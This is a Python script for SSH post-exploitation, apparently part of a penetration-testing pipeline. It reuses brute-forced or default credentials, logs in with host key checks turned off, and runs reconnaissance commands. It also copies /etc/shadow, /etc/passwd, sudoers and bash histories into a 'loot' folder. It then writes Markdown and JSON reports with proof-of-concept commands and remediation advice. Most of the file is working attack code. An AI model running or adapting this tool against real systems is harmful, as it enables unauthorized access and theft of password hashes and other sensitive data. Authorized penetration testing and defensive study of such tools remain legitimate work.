#!/usr/bin/env python3
import json
import subprocess
import argparse
import time
import re
from pathlib import Path
from typing import Dict, List, Tuple, Optional
import sys
import logging
import os

# Setup logging
logging.basicConfig(level=logging.INFO, format="%(asctime)s - %(levelname)s - %(message)s")
logger = logging.getLogger(__name__)

# Constants
OUTPUT_DIR = Path("outputs")
LOOT_DIR = OUTPUT_DIR / "loot"


def run_command(cmd: List[str], timeout: int = 180, **kwargs) -> Tuple[str, bool]:
    """Run a command and return its output and success status."""
    cmd_str = ' '.join(cmd)
    logger.info(f"Running: {cmd_str}")
    try:
        result = subprocess.run(
            cmd, stdout=subprocess.PIPE, stderr=subprocess.STDOUT,
            text=True, timeout=timeout, encoding="utf-8", errors="ignore", **kwargs
        )
        return result.stdout.strip(), result.returncode == 0
    except Exception as e:
        logger.error(f"Error running command {cmd_str}: {e}")
        return str(e), False


def execute_remote_command(target: str, port: int, user: str, password: str, command: str) -> Tuple[Optional[str], str]:
    """Execute a command remotely via SSH and return the output."""
    ssh_cmd = ["sshpass", "-p", password, "ssh", "-o", "StrictHostKeyChecking=no", "-o", "UserKnownHostsFile=/dev/null", "-p", str(port), f"{user}@{target}", command]
    output, success = run_command(ssh_cmd, timeout=60)
    poc = f"sshpass -p '{password}' ssh -o StrictHostKeyChecking=no {user}@{target} -p {port} '{command}'"
    if success:
        return output, poc
    return None, poc


def download_sensitive_files(target: str, port: int, user: str, password: str) -> List[Dict]:
    """Download sensitive files via SSH and save them to the loot directory."""
    logger.info("Attempting to download sensitive files.")
    findings = []
    LOOT_DIR.mkdir(exist_ok=True)
    
    sensitive_files = [
        ("/etc/passwd", "User accounts file."),
        ("/etc/shadow", "Potentially containing hashed passwords."),
        ("/root/.bash_history", "Root user command history."),
        (f"/home/{user}/.bash_history", "User command history."),
        ("/etc/sudoers", "Sudoers configuration, may reveal privilege escalation vectors."),
    ]

    for file_path, description in sensitive_files:
        content, poc = execute_remote_command(target, port, user, password, f"cat {file_path}")
        if content is not None:
            local_filename = f"{target}_{port}_{file_path.replace('/', '_')}.txt"
            local_filepath = LOOT_DIR / local_filename
            local_filepath.write_text(content)
            
            proof = f"Successfully downloaded '{file_path}' to '{local_filepath}'.\n\n**File Snippet:**\n```\n{content[:500]}\n```"
            recommendation = f"Sensitive file '{file_path}' is accessible. Review file permissions and restrict access. The full file has been saved to the loot directory for manual analysis."
            
            findings.append({
                "type": "sensitive_file_downloaded",
                "details": f"Downloaded sensitive file: {file_path}. {description}",
                "severity": "High", "impact": "Exposure of sensitive system or user data.",
                "proof": proof, "poc": poc, "recommendation": recommendation
            })
    return findings


def gather_system_information(target: str, port: int, user:str, password: str) -> List[Dict]:
    """Gather general system information after gaining access."""
    logger.info("Gathering general system information.")
    findings = []
    commands_to_run = {
        "OS & Kernel Information": "uname -a",
        "Running Processes": "ps aux",
        "Active Network Connections": "netstat -tulnp",
        "System Users": "getent passwd",
        "SUID Binaries": "find / -perm -u=s -type f 2>/dev/null"
    }

    for title, cmd in commands_to_run.items():
        output, poc = execute_remote_command(target, port, user, password, cmd)
        if output:
            findings.append({
                "type": "info_gathering",
                "details": f"Successfully executed '{cmd}' to gather: {title}",
                "severity": "Info", "impact": "Provides situational awareness for further exploitation.",
                "proof": f"**Command Output:**\n```\n{output}\n```",
                "poc": poc, "recommendation": "Review this information for further attack vectors, such as vulnerable software versions or misconfigurations."
            })
    return findings


def post_exploit_via_ssh(target: str, port: int, user: str, password: str) -> List[Dict]:
    """Orchestrate post-exploitation actions after SSH login."""
    logger.info(f"Starting SSH post-exploitation for {user}@{target}:{port}")
    all_findings = []
    
    all_findings.extend(gather_system_information(target, port, user, password))
    all_findings.extend(download_sensitive_files(target, port, user, password))
    
    return all_findings


def post_exploit_target(exploit_data: Dict) -> List[Dict]:
    """Intelligently triage successful exploits and launch post-exploitation."""
    target, port = exploit_data["target"], exploit_data["port"]
    successful_exploits = exploit_data.get("successful_exploits", [])
    
    # Sort exploits to prioritize the ones that give us credentials
    sorted_exploits = sorted(successful_exploits, key=lambda x: x.get("type") in ["ssh_brute_force", "ssh_default_credentials"], reverse=True)

    if not sorted_exploits:
        logger.warning("No successful exploits found in the input file. Cannot proceed with post-exploitation.")
        return []

    best_exploit = sorted_exploits[0]
    exploit_type = best_exploit.get("type")

    if exploit_type == 'ssh_brute_force':
        details = best_exploit.get("details", "")
        match = re.search(r"Found credentials: (\S+):(\S+)", details)
        if match:
            user, password = match.groups()
            logger.info(f"Extracted credentials for user '{user}'. Initiating post-exploitation.")
            return post_exploit_via_ssh(target, port, user, password)
    elif exploit_type == 'ssh_default_credentials':
        # For default creds, we can parse the user from the details string
        details = best_exploit.get("details", "")
        user_match = re.search(r"user '(\w+)'", details)
        if user_match:
            user = user_match.group(1)
            # We know the password is the same as the user for this exploit
            password = user
            logger.info(f"Extracted default credentials for user '{user}'. Initiating post-exploitation.")
            return post_exploit_via_ssh(target, port, user, password)

    logger.warning(f"The best exploit found ('{exploit_type}') does not provide credentials for post-exploitation. No actions taken.")
    return []


def save_post_exploit_report(findings: List[Dict], target: str, port: int) -> None:
    """Save post-exploitation results to comprehensive JSON and Markdown reports."""
    OUTPUT_DIR.mkdir(exist_ok=True)
    timestamp = time.strftime("%Y-%m-%d %H:%M:%S")

    report_data = {
        "target": target, "port": port, "service": "ssh", "timestamp": timestamp,
        "post_exploitation_findings": findings,
        "summary": {
            "total_findings": len(findings),
            "critical_findings": len([f for f in findings if f.get("severity") == "Critical"]),
            "high_findings": len([f for f in findings if f.get("severity") == "High"]),
        }
    }

    json_path = OUTPUT_DIR / f"{target}_{port}_ssh_post_exploit.json"
    with json_path.open("w") as f:
        json.dump(report_data, f, indent=4)
    logger.info(f"JSON report saved to {json_path}")

    md_path = OUTPUT_DIR / f"{target}_{port}_ssh_post_exploit.md"
    with md_path.open("w") as f:
        f.write(f"# SSH Post-Exploitation Report: {target}:{port}\n\n")
        f.write(f"**Generated:** {timestamp}\n\n")

        f.write("## Executive Summary\n\n")
        if not findings:
            f.write("No post-exploitation actions were successfully performed. This is likely because no exploitable remote access vulnerabilities were found in the previous phase.\n\n")
        else:
            summary_text = f"Post-exploitation was performed on {target}:{port} after gaining access. A total of **{len(findings)}** findings were documented. Key actions included downloading sensitive system files (e.g., `/etc/passwd`, `/etc/shadow`) and gathering detailed system information. These actions confirm significant host compromise. Immediate remediation is required.\n\n"
            f.write(summary_text)

        f.write("## Detailed Findings\n\n")
        if not findings:
            f.write("No findings to report.\n")
        else:
            for i, finding in enumerate(findings, 1):
                f.write(f"### {i}. {finding['type'].replace('_', ' ').title()}\n\n")
                f.write(f"- **Severity:** `{finding['severity']}`\n")
                f.write(f"- **Impact:** {finding['impact']}\n")
                f.write(f"- **Details:** {finding['details']}\n")
                f.write(f"- **PoC (Proof of Concept):** `{finding['poc']}`\n\n")
                f.write("**Evidence:**\n")
                f.write(f"{finding.get('proof', 'N/A').strip()}\n\n")
                f.write(f"**Recommendation:**\n\n{finding.get('recommendation', 'N/A')}\n\n")
                f.write("---\n\n")
    logger.info(f"Markdown report saved to {md_path}")


def find_exploit_file(target: str, port: int) -> Optional[Path]:
    """Find the exploit JSON file for the target and port."""
    exploit_file = OUTPUT_DIR / f"{target}_{port}_ssh_exploit.json"
    if exploit_file.exists():
        return exploit_file
    logger.error(f"No exploit file found at {exploit_file}. Please run the exploit script first.")
    return None


def main():
    parser = argparse.ArgumentParser(description="Advanced SSH Post-Exploitation Script")
    parser.add_argument("target", help="Target IP address")
    parser.add_argument("--port", type=int, required=True, help="Target SSH port")
    parser.add_argument("--attacker-ip", required=True, help="Attacker IP (for potential reverse shells)")
    parser.add_argument("--attacker-port", type=int, default=4444, help="Attacker port")
    parser.add_argument("--no-confirm", action="store_true", help="Skip confirmation prompts")
    args = parser.parse_args()

    # The --no-confirm argument is now handled by the parser, so no manual check is needed.
    
    try:
        exploit_file = find_exploit_file(args.target, args.port)
        if not exploit_file:
            logger.error("Could not find a corresponding successful SSH exploit file.")
            sys.exit(1)
            
        with exploit_file.open("r", encoding='utf-8') as f:
            exploit_data = json.load(f)
        
        post_exploit_findings = post_exploit_target(exploit_data)
        
        if post_exploit_findings:
            save_post_exploit_report(post_exploit_findings, args.target, args.port)
        else:
            logger.info("No actionable post-exploitation steps were taken.")

    except Exception as e:
        logger.error(f"An unexpected error occurred during post-exploitation: {e}", exc_info=True)
        sys.exit(1)


if __name__ == "__main__":
    main() 